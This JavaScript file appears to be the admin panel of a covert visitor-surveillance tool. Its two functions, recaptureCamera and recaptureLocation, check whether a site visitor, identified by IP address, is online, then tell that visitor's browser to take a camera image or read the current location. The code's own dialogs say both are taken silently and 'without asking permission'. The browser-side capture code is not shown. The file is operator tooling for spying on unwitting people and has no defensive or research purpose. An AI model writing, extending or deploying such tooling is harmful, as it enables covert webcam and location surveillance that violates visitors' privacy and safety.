// Recapture camera for a visitor
async function recaptureCamera(data) {
    try {
        // Check if visitor is online first
        const checkResponse = await fetch(`/api/check_visitor_online/${data.id}`);
        const checkData = await checkResponse.json();
        
        if (!checkData.online) {
            alert(`❌ Visitor is OFFLINE\n\nVisitor from ${data.ip_address} is not currently on the site.\n\nCamera recapture requires the visitor to be actively browsing.`);
            return;
        }

        if (!confirm(`📷 Recapture Camera\n\nVisitor: ${data.ip_address}\nStatus: ONLINE ✓\n\nThis will SILENTLY capture a new camera image without asking permission.\n\nContinue?`)) {
            return;
        }

        // Trigger silent recapture
        const response = await fetch(`/api/trigger_recapture_camera/${data.id}`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'}
        });
        
        const result = await response.json();
        
        if (result.success) {
            alert(`✅ SUCCESS!\n\nCamera recapture command sent to visitor's browser.\n\nThe image will be captured silently in the background.\n\nRefresh the page in a few seconds to see the new image.`);
            // Reload table after 3 seconds
            setTimeout(() => location.reload(), 3000);
        } else {
            alert(`❌ FAILED\n\n${result.message}\n\nThe visitor may have disconnected.`);
        }
    } catch(e) {
        alert(`❌ ERROR\n\n${e.message}\n\nPlease try again.`);
    }
}

// Recapture location for a visitor
async function recaptureLocation(data) {
    try {
        // Check if visitor is online first
        const checkResponse = await fetch(`/api/check_visitor_online/${data.id}`);
        const checkData = await checkResponse.json();
        
        if (!checkData.online) {
            alert(`❌ Visitor is OFFLINE\n\nVisitor from ${data.ip_address} is not currently on the site.\n\nLocation update requires the visitor to be actively browsing.`);
            return;
        }

        if (!confirm(`📍 Update Location\n\nVisitor: ${data.ip_address}\nStatus: ONLINE ✓\n\nThis will SILENTLY get the current location without asking permission.\n\nContinue?`)) {
            return;
        }

        // Trigger silent location update
        const response = await fetch(`/api/trigger_recapture_location/${data.id}`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'}
        });
        
        const result = await response.json();
        
        if (result.success) {
            alert(`✅ SUCCESS!\n\nLocation update command sent to visitor's browser.\n\nThe location will be updated silently in the background.\n\nRefresh the page in a few seconds to see the new location.`);
            // Reload table after 3 seconds
            setTimeout(() => location.reload(), 3000);
        } else {
            alert(`❌ FAILED\n\n${result.message}\n\nThe visitor may have disconnected.`);
        }
    } catch(e) {
        alert(`❌ ERROR\n\n${e.message}\n\nPlease try again.`);
    }
}
